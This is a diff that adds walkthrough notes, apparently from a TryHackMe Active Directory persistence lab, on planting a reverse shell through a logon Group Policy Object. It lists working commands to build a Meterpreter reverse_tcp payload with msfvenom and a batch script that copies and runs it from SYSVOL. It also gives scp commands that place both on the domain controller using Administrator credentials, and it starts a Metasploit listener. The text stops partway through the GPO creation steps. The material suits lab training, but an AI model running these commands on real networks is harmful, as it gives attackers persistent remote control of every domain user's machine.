@@ -1,0 +1,38 @@
+Preparation
+
+Before we can create the GPO. 
+We first need to create our shell, listener, and the actual bat file that will execute our shell. 
+
+Let's start by generating a basic executable shell that we can use:
+    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
+
+
+Make sure to add your username to the binary name to avoid overwriting the shells of other users. 
+Windows allows us to execute Batch or PowerShell scripts through the logon GPO. 
+Batch scripts are often more stable than PowerShell scripts so lets create one that will copy our executable to the host and execute it once a user authenticates. 
+
+Create the following script called <username>_script.bat on the AttackBox:
+    copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
+
+You will see that the script executes three commands chained together with &&. 
+The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.
+
+We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:
+Terminal Kali Script 
+    scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+    scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
+
+
+Finally, let's start our MSF listener:
+    msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
+
+With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.
+
+GPO Creation
+
+The first step uses our Domain Admin account to open the Group Policy Management snap-in:
+
+In your runas-spawned terminal, type MMC and press enter.
+Click on File->Add/Remove Snap-in...
+Select the Group Policy Management snap-in and click Add
+Click OK
